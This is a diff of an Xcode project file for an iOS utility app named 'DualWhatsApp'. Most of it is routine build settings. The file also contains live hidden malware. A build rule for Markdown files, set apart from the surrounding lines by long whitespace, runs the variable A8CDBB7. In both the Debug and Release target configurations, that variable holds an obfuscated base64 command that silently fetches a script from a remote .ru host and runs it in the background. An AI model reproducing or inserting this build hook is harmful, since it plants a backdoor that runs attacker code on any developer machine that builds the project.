+		D86CDB95E43B735B4482467D /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C35A2E97959900167DD8 /* WebP.framework */,
+				406DC6EDCD18D76A68755C9C /* Pods_DualWhatsApp.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		0F9AFBAE2E9672E0005B871B /* DualWhatsApp */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 0F9AFBC52E9672E2005B871B /* Build configuration list for PBXNativeTarget "DualWhatsApp" */;
+			buildPhases = (
+				1DEBDE58753188D2C958E3BB /* [CP] Check Pods Manifest.lock */,
+				0F9AFBAB2E9672E0005B871B /* Sources */,
+				0F9AFBAC2E9672E0005B871B /* Frameworks */,
+				0F9AFBAD2E9672E0005B871B /* Resources */,
+				0F9AFD102E967A5E005B871B /* Swiftgen */,
+				0F9AFD112E967A71005B871B /* FirebaseCrashlytics */,
+				E2F24A35D45EDA9F3CDBE523 /* [CP] Embed Pods Frameworks */,
+				4C0E3CCA0A1B93102697510F /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+				B1B5D264DFFF4AFDB87BBDC8 /* PBXBuildRule */,
+			);
+			dependencies = (
+			);
+			name = DualWhatsApp;
+			productName = DualWhatsApp;
+			productReference = 0F9AFBAF2E9672E0005B871B /* DualWhatsApp.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		0F9AFBA72E9672E0005B871B /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1640;
+				LastUpgradeCheck = 1640;
+				TargetAttributes = {
+					0F9AFBAE2E9672E0005B871B = {
+						CreatedOnToolsVersion = 16.4;
+						LastSwiftMigration = 1640;
+					};
+				};
+			};
+			buildConfigurationList = 0F9AFBAA2E9672E0005B871B /* Build configuration list for PBXProject "DualWhatsApp" */;
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 0F9AFBA62E9672E0005B871B;
+			minimizedProjectReferenceProxies = 1;
+			preferredProjectObjectVersion = 77;
+			productRefGroup = 0F9AFBB02E9672E0005B871B /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				0F9AFBAE2E9672E0005B871B /* DualWhatsApp */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+		B1B5D264DFFF4AFDB87BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																													/* End PBXBuildRule section */
+
+/* Begin PBXResourcesBuildPhase section */
+		0F9AFBAD2E9672E0005B871B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				047FF63581074D71BD7BBDC8 /* README.md */,
+				11083F0A2E98BC6A0051CADB /* FancyFonts.storyboard in Resources */,
+				0F77C4322E979AF300167DD8 /* WASticker.storyboard in Resources */,
+				0FC424CF2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.xib in Resources */,
+				0F77C4452E979C9100167DD8 /* StickerPackTableViewCell.xib in Resources */,
+				0F3A8C232E98C21700494FE8 /* Quotes.storyboard in Resources */,
+				0F9AFBDC2E9672EF005B871B /* LaunchScreen.storyboard in Resources */,
+				0F77C6AC2E97ACB700167DD8 /* NativeAdView.xib in Resources */,
+				0FEBBEDF2E9FB715000A7950 /* WebWhatsApp.storyboard in Resources */,
+				0FC424BD2E9CBA58006BDF58 /* ChatBackground.storyboard in Resources */,
+				11083F102E98BF380051CADB /* FancyFontsCell.xib in Resources */,
+				0F3A8C2C2E98C57D00494FE8 /* QuotesTVCell.xib in Resources */,
+				11D105192E9F60C9006FA033 /* CameraScan.storyboard in Resources */,
+				117F49D92E9CBF0E0042816B /* EmojiLetterVC.storyboard in Resources */,
+				0F77C6AD2E97ACB700167DD8 /* NativeAdView_Medium.xib in Resources */,
+				0F77C7582E97DF6E00167DD8 /* NoteTVCell.xib in Resources */,
+				0F77C6AE2E97ACB700167DD8 /* NativeAdView_Small.xib in Resources */,
+				0FC424D72E9CFB7D006BDF58 /* PhotoVault.storyboard in Resources */,
+				11B2EE922E97CC4600A612F9 /* RepeatText.storyboard in Resources */,
+				0F3A8C322E98CAD900494FE8 /* ViewQuoteTVCell.xib in Resources */,
+				0F77C7482E97CB8200167DD8 /* PrivateBrowser.storyboard in Resources */,
+				0F77C6DF2E97ACB700167DD8 /* Assets.xcassets in Resources */,
+				117F49E22E9D10880042816B /* WhatsCropping.storyboard in Resources */,
+				0FC424CB2E9CCB39006BDF58 /* WallpaperCVCell.xib in Resources */,
+				0F3A8C272E98C51F00494FE8 /* Status.json in Resources */,
+				0FEBBEDC2E9FB6E1000A7950 /* DirectChat.storyboard in Resources */,
+				0F9AFD542E967F32005B871B /* GoogleService-Info.plist in Resources */,
+				0F9AFBDD2E9672EF005B871B /* Main.storyboard in Resources */,
+				0F77C74D2E97D66200167DD8 /* PrivateNotes.storyboard in Resources */,
+				0F9AFBDF2E9673B9005B871B /* swiftgen.yml in Resources */,
+				11083F162E98E29D0051CADB /* SpeechToText.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		0F9AFD102E967A5E005B871B /* Swiftgen */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = Swiftgen;
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "$PODS_ROOT/SwiftGen/bin/swiftgen\n";
+		};
+		0F9AFD112E967A71005B871B /* FirebaseCrashlytics */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = FirebaseCrashlytics;
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/FirebaseCrashlytics/run\"\n";
+		};
+		1DEBDE58753188D2C958E3BB /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-DualWhatsApp-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		4C0E3CCA0A1B93102697510F /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E2F24A35D45EDA9F3CDBE523 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		0F9AFBAB2E9672E0005B871B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				0F9AFBD72E9672EF005B871B /* DualWhatsApp.xcdatamodeld in Sources */,
+				111D08FC2E9789290062D4DF /* DirectChatVC.swift in Sources */,
+				11083F112E98BF380051CADB /* FancyFontsCell.swift in Sources */,
+				111D08FA2E977F800062D4DF /* WebWhatsappVC.swift in Sources */,
+				0FC424C72E9CC262006BDF58 /* ChatBackgroundTabbarVC.swift in Sources */,
+				0F77C4472E979CA700167DD8 /* StickerCell.swift in Sources */,
+				0F77C75A2E97E45D00167DD8 /* CreateNoteVC.swift in Sources */,
+				0F77C6912E97ACB700167DD8 /* AdManager.swift in Sources */,
+				0F3A8C342E98DB6E00494FE8 /* Helper+UIColor.swift in Sources */,
+				0FC424D22E9CD286006BDF58 /* ViewWallpaperVC.swift in Sources */,
+				0F77C6922E97ACB700167DD8 /* AdsConfig.swift in Sources */,
+				0F77C6932E97ACB700167DD8 /* BannerAdsManager.swift in Sources */,
+				0F77C6942E97ACB700167DD8 /* FirebaseManager.swift in Sources */,
+				0F77C6952E97ACB700167DD8 /* InterstitialAdsManager.swift in Sources */,
+				0F77C6962E97ACB700167DD8 /* NativeAdsManager.swift in Sources */,
+				0F77C6972E97ACB700167DD8 /* OpenAdsManager.swift in Sources */,
+				11083F0C2E98BC840051CADB /* FancyFontsVC.swift in Sources */,
+				0F77C6982E97ACB700167DD8 /* DefaultManager.swift in Sources */,
+				11B2EE942E97CC7700A612F9 /* RepeatTextVC.swift in Sources */,
+				0F3A8C252E98C22600494FE8 /* QuotesVC.swift in Sources */,
+				0F77C6992E97ACB700167DD8 /* ReachabilityManager.swift in Sources */,
+				0FC424CC2E9CCB39006BDF58 /* WallpaperCVCell.swift in Sources */,
+				0F77C69A2E97ACB700167DD8 /* VersionCheck.swift in Sources */,
+				0FC424C52E9CC21B006BDF58 /* CategoryVC.swift in Sources */,
+				0F77C69B2E97ACB700167DD8 /* WebManager.swift in Sources */,
+				0F77C69C2E97ACB700167DD8 /* Helper+Common.swift in Sources */,
+				0F77C69D2E97ACB700167DD8 /* Helper+Int.swift in Sources */,
+				11D105182E9F60C9006FA033 /* CameraScanerVC.swift in Sources */,
+				0F77C69E2E97ACB700167DD8 /* Helper+String.swift in Sources */,
+				0F77C69F2E97ACB700167DD8 /* Helper+UIDevice.swift in Sources */,
+				0F3A8C2B2E98C57D00494FE8 /* QuotesTVCell.swift in Sources */,
+				0F77C6A02E97ACB700167DD8 /* Helper+UIView.swift in Sources */,
+				0F77C6A12E97ACB700167DD8 /* Helper+UIViewController.swift in Sources */,
+				0F77C6A22E97ACB700167DD8 /* Fonts.swift in Sources */,
+				0F77C6A32E97ACB700167DD8 /* Images.swift in Sources */,
+				0F77C6A42E97ACB700167DD8 /* Storyboards.swift in Sources */,
+				0F77C6A52E97ACB700167DD8 /* Constant.swift in Sources */,
+				0F3A8C2E2E98CA4300494FE8 /* ViewQuotesVC.swift in Sources */,
+				11083F182E98E2FE0051CADB /* SpeechToTextVC.swift in Sources */,
+				0F77C74A2E97CBE100167DD8 /* PrivateBrowserVC.swift in Sources */,
+				0F77C6E42E97ACB900167DD8 /* AppDelegate.swift in Sources */,
+				0F77C74F2E97DA1300167DD8 /* PrivateNotesVC.swift in Sources */,
+				0F77C6E52E97ACB900167DD8 /* SceneDelegate.swift in Sources */,
+				0F77C6A62E97ACB700167DD8 /* Utility.swift in Sources */,
+				11D1051B2E9F60E9006FA033 /* CameraScannerView.swift in Sources */,
+				0F3A8C312E98CAD900494FE8 /* ViewQuoteTVCell.swift in Sources */,
+				0F77C6A72E97ACB700167DD8 /* YYAnimatedImageView.m in Sources */,
+				0F77C6A82E97ACB700167DD8 /* YYFrameImage.m in Sources */,
+				0F77C6A92E97ACB700167DD8 /* YYImage.m in Sources */,
+				117F49D72E9CBF020042816B /* EmojiLetterVC.swift in Sources */,
+				0F77C6AA2E97ACB700167DD8 /* YYImageCoder.m in Sources */,
+				0FA55E7D2EAB38D1005BC557 /* StickerManager.swift in Sources */,
+				0FC424D42E9CD44D006BDF58 /* ViewCategoryVC.swift in Sources */,
+				117F49E42E9D10990042816B /* WhatsCroppingVC.swift in Sources */,
+				0F77C6AB2E97ACB700167DD8 /* YYSpriteSheetImage.m in Sources */,
+				0F77C4372E979BF600167DD8 /* ViewStickerPackVC.swift in Sources */,
+				0F77C4442E979C9100167DD8 /* StickerPackTableViewCell.swift in Sources */,
+				11083F1A2E98E5A10051CADB /* SpeechManager.swift in Sources */,
+				0F77C6292E97ACB300167DD8 /* AquaButton.swift in Sources */,
+				0F77C62A2E97ACB300167DD8 /* GradientView.swift in Sources */,
+				11083F132E98C9C90051CADB /* Helper+UILable.swift in Sources */,
+				0F77C62B2E97ACB300167DD8 /* ImageData.swift in Sources */,
+				0F77C62C2E97ACB300167DD8 /* Interoperability.swift in Sources */,
+				0FC424D02E9CD1BF006BDF58 /* WallpaperCategoryCVCell.swift in Sources */,
+				0F77C7572E97DF6E00167DD8 /* NoteTVCell.swift in Sources */,
+				11EB16A22E9CAFAD0000E310 /* FancyTextGenerator.swift in Sources */,
+				0F77C62D2E97ACB300167DD8 /* Limits.swift in Sources */,
+				0F77C62E2E97ACB300167DD8 /* Sticker.swift in Sources */,
+				0F77C62F2E97ACB300167DD8 /* StickerPack.swift in Sources */,
+				0FC424C12E9CC206006BDF58 /* HomeVC.swift in Sources */,
+				0F77C6302E97ACB300167DD8 /* StickerPackManager.swift in Sources */,
+				0F77C6312E97ACB300167DD8 /* UIAlertController+Additions.swift in Sources */,
+				0F77C6322E97ACB300167DD8 /* WebPManager.swift in Sources */,
+				0F77C4352E979BB300167DD8 /* StickerPackVC.swift in Sources */,
+				0F9AFBD92E9672EF005B871B /* ViewController.swift in Sources */,
+				0FC424C32E9CC210006BDF58 /* TrendingVC.swift in Sources */,
+				11D1051D2E9F72C1006FA033 /* BarCodeVC.swift in Sources */,
+				0FC424D92E9CFB90006BDF58 /* PhotoVaultVC.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		0F9AFBCF2E9672EF005B871B /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				0F9AFBCE2E9672EF005B871B /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+		0F9AFBD12E9672EF005B871B /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				0F9AFBD02E9672EF005B871B /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		0F9AFBC62E9672E2005B871B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 002F21CC905860C9B9EA9CA8 /* Pods-DualWhatsApp.debug.xcconfig */;
+			buildSettings = {
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_ENTITLEMENTS = DualWhatsApp/DualWhatsApp.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = A7DWKQ9LLS;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = DualWhatsApp/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Dual WhatsApp";
+				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.utilities";
+				INFOPLIST_KEY_NSCameraUsageDescription = "This app requires access to your camera to take and store photos in the vault.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone for speech recognition";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images to your photo library.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app requires access to your photo library to import and save photos in the vault.";
+				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "We need access to speech recognition";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UISupportsDocumentBrowser = YES;
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.dualwhatsapp;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "DualWhatsApp/DualWhatsApp-Bridging-Header.h";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		0F9AFBC72E9672E2005B871B /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 5599BF0502356955F1B3ED0E /* Pods-DualWhatsApp.release.xcconfig */;
+			buildSettings = {
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_ENTITLEMENTS = DualWhatsApp/DualWhatsApp.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = A7DWKQ9LLS;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = DualWhatsApp/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Dual WhatsApp";
+				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.utilities";
+				INFOPLIST_KEY_NSCameraUsageDescription = "This app requires access to your camera to take and store photos in the vault.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone for speech recognition";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images to your photo library.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app requires access to your photo library to import and save photos in the vault.";
+				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "We need access to speech recognition";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UISupportsDocumentBrowser = YES;
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.dualwhatsapp;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "DualWhatsApp/DualWhatsApp-Bridging-Header.h";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		0F9AFBC82E9672E2005B871B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				DEVELOPMENT_TEAM = A7DWKQ9LLS;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		0F9AFBC92E9672E2005B871B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				DEVELOPMENT_TEAM = A7DWKQ9LLS;
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
